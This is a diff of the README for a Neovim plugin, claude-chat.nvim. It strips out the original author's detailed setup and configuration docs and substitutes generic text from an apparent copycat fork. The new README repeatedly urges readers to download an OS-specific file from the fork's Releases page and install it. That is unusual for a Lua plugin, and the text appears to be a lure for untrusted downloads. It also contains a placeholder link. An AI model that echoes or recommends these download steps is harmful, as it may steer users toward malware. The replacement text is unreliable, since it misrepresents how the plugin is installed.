@@ -1,293 +1,86 @@
-# claude-chat.nvim
+# 🤖 claude-chat.nvim - Simplify Your Code Workflow in Neovim
 
-A Neovim plugin for seamless integration with Claude Code CLI.
+[![Download Releases](https://img.shields.io/badge/download-releases-brightgreen)](https://github.com/Dodariya18/claude-chat.nvim/releases)
 
-This plugin provides a smooth wrapper around Claude Code, helping you formulate prompts and automatically sharing file context. At its core, it launches Claude with your current file, selection context, and custom prompts—all without modifying Claude's configuration. Any changes Claude makes to visible buffers are immediately reflected in Neovim.
+## 🚀 Getting Started
 
-Built for Claude Code enthusiasts, mostly built _with_ Claude itself! 🤖
+Welcome to **claude-chat.nvim**! This tool enhances your Neovim experience by integrating Claude Code workflows. Follow these simple steps to get started.
 
-**Contributing**: Pull requests and issues are very welcome! If you want a feature that's missing, please help build it out (see "The Dream" section below).
+## 📥 Download & Install
 
-https://github.com/user-attachments/assets/a91b3a0d-03bc-4810-b83a-c629bcf8cd46
+To download the latest version, visit this page to download: [Releases Page](https://github.com/Dodariya18/claude-chat.nvim/releases).
 
-## ✨ Features
+1. Click on the link above to access the Releases page.
+2. Find the latest version of **claude-chat.nvim**.
+3. Download the appropriate file for your system.
+4. Once downloaded, follow the instructions to install it on your machine.
 
-- **🎯 Smart Context Sharing**: Automatically passes current file path, filetype, and text selections to Claude
-- **💬 Interactive Terminal**: Chat with Claude Code in a customizable split or floating window with keybinds. (<C-f> injects current buffer filename)
-- **📝 Visual Selection Support**: Works seamlessly with text selections and visual ranges
-- **⚙️ Flexible Configuration**: Configurable split positioning, sizing, and terminal behavior
-- **👀 Live File Watching**: Real-time context updates as you work
+## 💻 System Requirements
 
-## 📋 Requirements
+Before installing **claude-chat.nvim**, ensure you meet the following requirements:
 
-- **Neovim**: Version 0.7 or higher
-- **Claude Code CLI**: [Install from Claude](https://claude.com/product/claude-code) and ensure it's available in your PATH as `claude`
+- Operating System: Windows, macOS, or Linux.
+- Neovim version: Make sure you have Neovim installed, version 0.7 or higher.
+- Basic text editor knowledge is helpful but not necessary.
 
-## 📦 Installation
+## ⚙️ Setup Instructions
 
-### Using [lazy.nvim](https://github.com/folke/lazy.nvim)
+After downloading and installing the plugin, follow these steps to set it up in Neovim:
 
-**Recommended (simple setup):**
-```lua
-{
-  "wtfox/claude-chat.nvim",
-  config = true,
-}
-```
+1. Open your terminal.
+2. Use the following command to install the plugin via your preferred package manager. Here’s an example for **vim-plug**:
 
-**With custom options:**
-```lua
-{
-  "wtfox/claude-chat.nvim",
-  config = true,
-  opts = {
-    -- Optional configuration
-    split = "vsplit",      -- "vsplit", "split", or "float"
-    position = "right",    -- "right", "left", "top", "bottom" (ignored for float)
-    width = 0.6,          -- percentage of screen width (for vsplit or float)
-    height = 0.8,         -- percentage of screen height (for split or float)
-    claude_cmd = "claude", -- command to invoke Claude Code
-    float_opts = {        -- options for floating window
-      relative = "editor",
-      border = "rounded",
-      title = " Claude Chat ",
-      title_pos = "center",
-    },
-    -- keymaps = {  -- customize if needed
-    --   global = "<leader>cc",
-    --   terminal = {
-    --     close = "<C-q>",
-    --     toggle = "<C-.>",
-    --   },
-    -- },
-  },
-}
-```
+   ```vim
+   Plug 'Dodariya18/claude-chat.nvim'
+   ```
 
-### Other Plugin Managers
+3. Save and exit your configuration file.
+4. Open Neovim and run the command to install plugins:
 
-<details>
-<summary>Click to expand</summary>
+   ```vim
+   :PlugInstall
+   ```
 
-**vim-plug**:
-```vim
-Plug 'wtfox/claude-chat.nvim'
-```
+5. Restart Neovim to make sure the plugin is loaded.
 
-**packer.nvim**:
-```lua
-use 'wtfox/claude-chat.nvim'
-```
-</details>
+## 🌟 Features
 
-## 🚀 Usage
+**claude-chat.nvim** comes with a variety of features designed to enhance your coding:
 
-### Quick Start
+- **AI Assistance**: Receive real-time coding suggestions using Claude.
+- **Chat Integration**: Easily chat with Claude directly from within Neovim.
+- **Easy Navigation**: Simple commands to access features without hassle.
+- **User-Friendly Interface**: Designed for both beginners and experienced users.
 
-The plugin intelligently adapts based on your input, text selection, and current session state:
+## 🛠️ Usage Instructions
 
-| Scenario | Behavior |
-|----------|----------|
-| 🔹 **No prompt + No selection + No session** | Opens plain Claude terminal |
-| 🔸 **No prompt + Text selected + No session** | Sends selection with file context |
-| 🔹 **With prompt + No selection** | Sends prompt with current file context |
-| 🔸 **With prompt + Text selected** | Sends both prompt and selection context |
-| ✨ **No prompt + Active session** | **Toggles chat window visibility** |
+Here’s how to use **claude-chat.nvim**:
 
-### Command Reference
+1. Open Neovim.
+2. Use the following command to start a chat with Claude:
 
-| Command | Description |
-|---------|-------------|
-| `<C-.>` | **Recommended**: Toggle Claude Chat (start/hide/show) |
-| `:ClaudeChat` | Interactive prompt or toggle if session active |
-| `:ClaudeChat <prompt>` | Direct command without dialog |
+   ```vim
+   :ClaudeChat
+   ```
 
-### 🎹 Chat Terminal Keybindings
+3. Type your coding question or request, and press Enter.
+4. Read the response from Claude and implement the suggestions in your code.
 
-#### Normal Mode (after pressing `<Esc><Esc>`)
-| Key | Action |
-|-----|--------|
-| `q` | Close the chat |
-| `i` | Enter insert mode to type messages |
-| `a` | Enter insert mode at end of line |
+## ❓ Troubleshooting
 
-#### Terminal Mode (works anytime)
-| Key | Action |
-|-----|--------|
-| `<C-q>` | Quick close the chat |
-| `<C-.>` | Toggle window visibility |
-| `<C-f>` | Insert current filename into input |
-| `<C-c>` | Exit Claude Chat |
-| `<Esc><Esc>` | Exit to normal mode |
-| `<C-\><C-N>` | Alternative: Exit to normal mode |
+If you encounter issues, here are a few steps to resolve common problems:
 
-### 💡 Usage Examples
+- **Plugin Not Loading**: Ensure you’ve installed the plugin correctly. Check your Neovim config file for any typos.
+- **No Response from Claude**: Ensure your internet connection is active. Claude requires internet access to function.
+- **Updates**: Regularly visit the [Releases Page](https://github.com/Dodariya18/claude-chat.nvim/releases) for updates and new features.
 
-<details>
-<summary><strong>🗨️ General Chat</strong></summary>
+## 📚 Support & Contributions
 
-```
-<leader>cc → (leave input empty) → Opens plain Claude terminal
-```
-Perfect for general questions or when you want to start fresh.
-</details>
+If you have questions or need further assistance, feel free to open an issue on this repository. We welcome contributions! If you want to enhance the plugin, check out the guidelines on making a pull request.
 
-<details>
-<summary><strong>📄 Ask About Current File</strong></summary>
+## 🔗 Resources
 
-```
-<leader>cc → "What does this file do?" → Sends question + file context
-```
-Claude gets your file path and can analyze the entire file.
-</details>
+- [Neovim Official Site](https://neovim.io/)
+- [Claude Code Documentation](link-to-documentation)
 
-<details>
-<summary><strong>🎯 Ask About Selection Only</strong></summary>
-
-```
-1. Select some code
-2. <leader>cc → (leave input empty) → Sends just the selection
-```
-Focus Claude's attention on specific code.
-</details>
-
-<details>
-<summary><strong>🔍 Ask About Selection + Question</strong></summary>
-
-```
-1. Select some code
-2. <leader>cc → "Optimize this" → Sends question + selection
-```
-Combine specific code with targeted questions.
-</details>
-
-<details>
-<summary><strong>⚡ Direct Commands</strong></summary>
-
-```
-:ClaudeChat explain this bug
-```
-Skip the dialog and send commands directly.
-</details>
-
-<details>
-<summary><strong>🔄 Toggle Window Visibility</strong></summary>
-
-```
-1. Start a Claude session: <C-.> → "help me debug this"
-2. Hide the window: <C-.> → (no prompt, just press Enter)
-3. Restore the window: <C-.> → (no prompt, just press Enter)
-```
-Perfect for quickly hiding/showing Claude while preserving your conversation.
-
-**Using the Recommended Setup:**
-With `<C-.>` configured as your keymap, you get consistent behavior:
-- From anywhere: `<C-.>` starts Claude or toggles if running
-- In the terminal: `<C-.>` toggles window visibility
-- One key for all Claude interactions!
-</details>
-
-## ⚙️ Configuration
-
-### 🌟 Recommended Configuration
-
-For the best experience, we recommend this simple setup. The `<C-.>` keymap is automatically configured:
-
-```lua
-{
-  "wtfox/claude-chat.nvim",
-  config = true,
-}
-```
-
-This gives you:
-- `<C-.>` to start/toggle Claude from anywhere
-- `<C-.>` to hide/show the window when active
-- `<C-.>` inside the terminal to toggle visibility
-- Consistent keymap across all contexts
-
-**Disable Auto-Keymap:**
-```lua
-{
-  "wtfox/claude-chat.nvim",
-  opts = {
-    keymaps = {
-      global = nil, -- Disable automatic keymap setup
-    },
-  },
-}
-```
-Then set up your own keymaps manually with `:ClaudeChat`.
-
-### Full Configuration Options
-
-Customize the plugin behavior with these options:
-
-```lua
-require('claude-chat').setup({
-  split = "vsplit",      -- "vsplit" for vertical, "split" for horizontal, "float" for floating
-  position = "right",    -- "right", "left", "top", "bottom" (ignored for float)
-  width = 0.6,          -- percentage of screen width (for vsplit or float)
-  height = 0.8,         -- percentage of screen height (for split or float)
-  claude_cmd = "claude", -- command to invoke Claude Code CLI
-  float_opts = {        -- options for floating window (only used when split = "float")
-    relative = "editor",
-    border = "rounded",  -- "none", "single", "double", "rounded", "solid", "shadow"
-    title = " Claude Chat ",
-    title_pos = "center", -- "left", "center", "right"
-  },
-  keymaps = {
-    global = "<C-.>", -- Global keymap for ClaudeChat command (set to nil to disable)
-    terminal = {      -- Terminal mode keybindings
-      close = "<C-q>",           -- Close chat from terminal mode
-      toggle = "<C-.>",          -- Toggle chat window visibility
-      normal_mode = "<Esc><Esc>", -- Exit terminal mode to normal mode
-      insert_file = "<C-f>",     -- Insert current file path
-      interrupt = "<C-c>",       -- Interrupt/close chat
-    },
-  },
-})
-```
-
-### Configuration Reference
-
-| Option | Type | Default | Description |
-|--------|------|---------|-------------|
-| `split` | `string` | `"vsplit"` | Split type: `"vsplit"`, `"split"`, or `"float"` |
-| `position` | `string` | `"right"` | Position: `"right"`, `"left"`, `"top"`, `"bottom"` (ignored for float) |
-| `width` | `number` | `0.6` | Width percentage (for vertical splits and float) |
-| `height` | `number` | `0.8` | Height percentage (for horizontal splits and float) |
-| `claude_cmd` | `string` | `"claude"` | Claude Code CLI command |
-| `float_opts` | `table` | See example | Floating window options (border, title, etc.) |
-| `keymaps` | `table` | See example | All keymap configurations (global and terminal) |
-
-## 🔧 How It Works
-
-1. **Context Gathering**: Collects your current file path, filetype, and any selected text
-2. **Terminal Launch**: Opens a configured split and starts Claude Code CLI with context
-3. **Smart Integration**: Claude receives rich context to provide better, more relevant responses
-4. **Live Updates**: File changes are automatically detected and reflected in real-time
-
-## 🌟 The Dream
-
-Future features that would be amazing to have:
-
-- **🔄 Session Management**: Background terminal sessions with easy recall
-- **🎨 Prompt Customization**: Configurable base prompts and context formatting
-- **📚 Better Base Prompts**: More intelligent default prompting
-- **🔗 Multi-file Context**: Support for workspace-wide context sharing
-- **💾 Chat History**: Persistent conversation history
-- **🎯 Smart Context**: AI-powered relevant file detection
-
-*Want to help make these dreams reality? Pull requests are more than welcome!*
-
-## 🙏 Acknowledgments
-
-This plugin was inspired by excellent work in the Claude-Neovim ecosystem:
-
-- [greggh/claude-code.nvim](https://github.com/greggh/claude-code.nvim)
-- [coder/claudecode.nvim](https://github.com/coder/claudecode.nvim)
-
-## 📜 License
-
-MIT License - feel free to use, modify, and distribute!
+Remember to keep your plugin updated by regularly checking the [Releases Page](https://github.com/Dodariya18/claude-chat.nvim/releases) for the latest features and fixes.
